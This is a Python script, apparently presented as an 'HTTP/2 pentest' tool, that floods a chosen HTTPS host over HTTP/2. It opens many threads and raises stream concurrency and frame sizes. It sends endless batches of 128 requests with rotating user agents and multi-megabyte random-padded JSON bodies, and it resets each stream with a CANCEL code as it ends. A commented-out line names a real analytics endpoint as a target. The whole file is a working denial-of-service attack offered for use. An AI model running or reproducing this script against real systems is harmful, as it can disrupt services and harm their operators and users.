
import socket
import ssl
import random
import signal
import json
import datetime
import string
import threading
import time
from argparse import ArgumentParser
import h2
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded, SettingsAcknowledged, WindowUpdated, \
    RemoteSettingsChanged, ConnectionTerminated
from h2.settings import SettingCodes
import select

gtimeout=5

def get_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.3',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Safari/605.1.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.79',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.6',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.7',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.5',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Edg/92.0.902.6',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4450.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.5',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.41',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.37',
        'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Whale/3.21.192.18 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0']
    user_agent = random.choice(user_agents)
    return user_agent

def generate_random_ip():
    octets = []
    for _ in range(4):
        octet = str(random.randint(0, 255))
        octets.append(octet)

    ip_address = ".".join(octets)
    return ip_address

def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    #print("Random string of length", length, "is:", result_str)
    return result_str

def shutdown():
    print("Shutting down gracefully...")
    exit(0)

# Set up a signal handler for Ctrl+C (SIGINT)
signal.signal(signal.SIGINT, lambda signum, frame: shutdown())

def get_timestamp():
    now = datetime.datetime.now()
    dtm = int(now.timestamp() * 1000)
    delta = datetime.timedelta(seconds=1)
    stm = int(dtm + delta.total_seconds() * 1000)
    # print("dtm : ", dtm)
    # print("stm : ", stm)
    return dtm, stm

def regain_events(k):
    snow1 = ""
    if k == 1:
        snow1 = """
        """
    if k == 2:
        snow1 = """
        """
    if k == 3:
        snow1 = """
        """
    if k == 4:
        snow1 = """
        """
    if k == 5:
        snow1 = """
        """
    if k == 6:
        snow1 = """
        """
    if k == 7:
        snow1 = """
        """
    if k == 8:
        snow1 = """
        """
    if k == 9:
        snow1 = """
        """
    if k == 10:
        snow1 = """
        """
    if k == 11:
        snow1 = """
        """
    if k == 12:
        snow1 = """
        """
    if k == 13:
        snow1 = """
        """
    if k == 14:
        snow1 = """
        """
    if k == 15:
        snow1 = """
        """
    if k == 16:
        snow1 = """
        """
    if k == 17:
        snow1 = """
        """
    if k == 17:
        snow1 = """
        """
    if k == 18:
        snow1 = """
        """
    if k == 19:
        snow1 = """
        """
    if k == 20:
        snow1 = """
        """
    if k == 21:
        snow1 = """
        """
    if k == 22:
        snow1 = """
        """
    return snow1


class H2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.conn = H2Connection(H2Configuration(client_side=True))
        self.socket = self._create_socket()
        #self.stream_id = None
        self.streams = {}

    def _create_socket(self):
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])
        raw_socket = socket.create_connection((self.host, self.port))
        ssl_socket = context.wrap_socket(raw_socket, server_hostname=self.host)
        negotiated_protocol = ssl_socket.selected_alpn_protocol()
        if negotiated_protocol != 'h2':
            raise RuntimeError(f'Failed to negotiate HTTP/2, got {negotiated_protocol}')
        return ssl_socket

    def update_settings(self, new_settings):
        self.conn.update_settings(new_settings)
        self.socket.sendall(self.conn.data_to_send())

    def send_request(self, headers, body=None):
        stream_id = self.conn.get_next_available_stream_id()
        self.conn.send_headers(stream_id, headers)
        self.socket.sendall(self.conn.data_to_send())

        if body:
            self.send_data_in_chunks(stream_id, body)
            #self.conn.send_data(stream_id, body, end_stream=True)
            #self.socket.sendall(self.conn.data_to_send())
        self.streams[stream_id] = {
            'response_headers': None,
            'response_data': b'',
            'ended': False
        }
        return stream_id

    def send_data_in_chunks(self, stream_id, body):
        #chunk_size = 65536  # Size specified in the Akka documentation
        chunk_size = self.conn.local_settings.max_frame_size
        print("chunk size; ", str(chunk_size))
        body_length = len(body)
        for i in range(0, body_length, chunk_size):
            chunk = body[i:i + chunk_size]
            end_stream = (i + chunk_size) >= body_length
            self._send_chunk(stream_id, chunk, end_stream)

    def _send_chunk(self, stream_id, chunk, end_stream):
        while len(chunk) > 0:
            window_size = self.conn.local_flow_control_window(stream_id)
            to_send = min(window_size, len(chunk))
            if to_send == 0:
                self._wait_for_window_update()
                continue
            self.conn.send_data(stream_id, chunk[:to_send], end_stream=end_stream and (to_send == len(chunk)))
            self.socket.sendall(self.conn.data_to_send())
            chunk = chunk[to_send:]

    def _wait_for_window_update(self):
        while True:
            read_ready, _, _ = select.select([self.socket], [], [])
            for sock in read_ready:
                data = sock.recv(65535)
                if not data:
                    continue
                events = self.conn.receive_data(data)
                for event in events:
                    print(event)
                    if isinstance(event, WindowUpdated):
                        #print(f"Window updated: {event.stream_id}, delta: {event.delta}")
                        pass
                    elif isinstance(event, ResponseReceived):
                        #status_code = event.headers[b'status']
                        status_code = 404
                        try:
                            self.streams[event.stream_id]['response_headers'] = event.headers
                        except Exception as e:
                            print("status code : ", str(status_code))
                        #print(f"Response headers received for stream {event.stream_id}: {event.headers}")
                    elif isinstance(event, DataReceived):
                        try:
                            self.streams[event.stream_id]['response_data'] += event.data
                            self.conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                        except Exception as e:
                            print("event data : ")
                        #print(f"Response data: {event.data}")
                    elif isinstance(event, StreamEnded):
                        try:
                            self.streams[event.stream_id]['ended'] = True
                            self.conn.reset_stream(stream_id=event.stream_id, error_code=0x8)
                        except  Exception as e:
                            print(f"Stream reset {event.stream_id}")
                        #print(
                            #f"Stream {event.stream_id} ended with data: {self.streams[event.stream_id]['response_data']}")
                self.socket.sendall(self.conn.data_to_send())
                # Check if window update received
                if any(isinstance(event, WindowUpdated) for event in events):
                    return

    def get_open_streams(self):
        open_streams = []
        for stream_id in self.streams:
            if not self.streams[stream_id]['ended']:
                open_streams.append(stream_id)
        if open_streams:
            print(f"Still open streams: {open_streams}")
        return open_streams

    def env_renew(self):
        self.streams={}
    def receive_responses(self):
        global gtimeout
        while self.streams:
            read_ready, _, _ = select.select([self.socket], [], [], gtimeout)
            if not read_ready:
                print("Timeout occurred, sending ping to keep connection alive")
                #print(self.streams)
                self.conn.ping(b'\x00' * 8)
                self.socket.sendall(self.conn.data_to_send())
                #continue
                return
            for sock in read_ready:
                data = sock.recv(65535)
                if not data:
                    continue
                events = self.conn.receive_data(data)
                for event in events:
                    print(event)
                    if isinstance(event, ResponseReceived):
                        #status_code = event.headers[b'status']
                        status_code = 404
                        try:
                            self.streams[event.stream_id]['response_headers'] = event.headers
                        except Exception as e:
                            print("status code : ", str(status_code))
                        #print(f"Response headers received for stream {event.stream_id}: {event.headers}")
                    elif isinstance(event, DataReceived):
                        try:
                            self.streams[event.stream_id]['response_data'] += event.data
                            self.conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                        except Exception as e:
                            print("event data : ")
                        #print(f"Response data: {event.data}")
                    elif isinstance(event, StreamEnded):
                        try:
                            self.streams[event.stream_id]['ended'] = True
                            self.conn.reset_stream(stream_id=event.stream_id, error_code=0x8)
                        except  Exception as e:
                            print(f"Stream reset {event.stream_id}")
                        #print(
                            #f"Stream {event.stream_id} ended with data: {self.streams[event.stream_id]['response_data']}")
                    elif isinstance(event, SettingsAcknowledged):
                        #print(f"Settings acknowledged: {event.changed_settings}")
                        pass
                    elif isinstance(event, RemoteSettingsChanged):
                        #print(f"Remote settings changed: {event.changed_settings}")
                        pass
                    elif isinstance(event, WindowUpdated):
                        #print(f"Window updated: {event.stream_id}, delta: {event.delta}")
                        pass
                    elif isinstance(event, ConnectionTerminated):
                        #print(f"Connection terminated: error_code={event.error_code}, last_stream_id={event.last_stream_id}")
                        return
                self.socket.sendall(self.conn.data_to_send())
            self.streams = {k: v for k, v in self.streams.items() if not v['ended']}
def main(lock, numthread, host, path):
    print("Thread : ", str(numthread))
    #host = 'events.betterhelp.com'
    #path = '/com.snowplowanalytics.snowplow/tp2'
    port = 443
    wsinit = 1048576  # Desired initial window size
    glk = 1
    max_requests = 128
    num_requests = max_requests
    client = H2Client(host, port)
    client.conn.initiate_connection()
    client.socket.sendall(client.conn.data_to_send())

    # Update settings
    new_settings = {
        SettingCodes.MAX_CONCURRENT_STREAMS: 512,
        SettingCodes.INITIAL_WINDOW_SIZE: wsinit,
        SettingCodes.MAX_FRAME_SIZE: 16777215
    }
    client.update_settings(new_settings)

    while True:
        for i in range(num_requests):
            the_methods = ['GET', 'POST', 'POST']
            chosen_method = random.choice(the_methods)
            the_tz = [0, 1, 0]
            tz = random.choice(the_tz)
            headers = []
            body = None
            #chosen_method = "POST"
            print("Chosen Method: ", chosen_method)
            if chosen_method == "GET":
                headers = [
                    (':method', 'GET'),
                    (':scheme', 'https'),
                    (':authority', host),
                    (':path', path),
                    ('user-agent', get_user_agent()),
                    ('sp-anonymous', '*'),
                    ('origin', 'https://www.yourorigin.com'),
                    ('referer', 'https://www.yourreferer.com/')
                ]

            if chosen_method == "POST":
                if glk > 22:
                    glk = 1

                dtm, stm = get_timestamp()
                snow1 = regain_events(glk)
                snow1 = snow1.replace("timestamp1", str(dtm))
                snow1 = snow1.replace("timestamp2", str(stm))

                the_fs = [0, 1, 0, 1]
                fs = random.choice(the_fs)

                zz = "Europe/Zurich"
                #vr = random.randrange(32768, 65536, 4096)
                vr = random.randrange(3276800, 6553600, 409600)
                if tz == 1:
                    zz = "Europe/Zurich" + get_random_string(vr)
                snow1 = snow1.replace("sntimezone", zz)
                # print(snow1)
                body = json.dumps(snow1).encode('utf-8')
                glk = glk + 1
                headers = [
                    (':method', 'POST'),
                    (':authority', host),
                    (':scheme', 'https'),
                    (':path', path),
                    ('user-agent', get_user_agent()),
                    ('sp-anonymous', '*'),
                    ('content-type', 'application/json; charset=UTF-8'),
                    ('content-length', str(len(body))),
                    ('origin', 'https://www.yourorigin.com'),
                    ('referer', 'https://www.yourreferer.com/')
                ]

            #print(headers)
            client.send_request(headers, body)
            delay = random.random()
            #time.sleep(0 + delay)


        client.receive_responses()
        print("-----------> END OF NUM_REQUESTS : ", str(num_requests))
        #exit()
        vs = client.get_open_streams()
        if len(vs) > 0:
            print("Number of streams: ", len(vs))
        num_requests = max_requests - len(vs)
        client.env_renew()

if __name__ == "__main__":
    print('Example : python3 http2pentest.py your_host /your_path num_thread')
    print('CTRL+C to exit')
    print('\n')
    arg_parser = ArgumentParser()
    arg_parser.add_argument('host', help='host')
    arg_parser.add_argument('path', help='resource path')
    #arg_parser.add_argument('scheme', help='http or https')
    arg_parser.add_argument('maxthreads', help='max threads')
    args = arg_parser.parse_args()
    print(args)
    host = args.host
    path = args.path
    mx = args.maxthreads
    print('host: ', host)
    print('path: ', path)
    print('maxthreads: ', mx)
    maxThreads = int(mx)
    iThread = 1
    lck = threading.Lock()
    while True:
        if iThread > maxThreads:
            break
        lck.acquire()
        tx = threading.Thread(target=main, args=(lck, iThread, host, path))
        tx.start()
        iThread += 1
        lck.release()
        time.sleep(1)

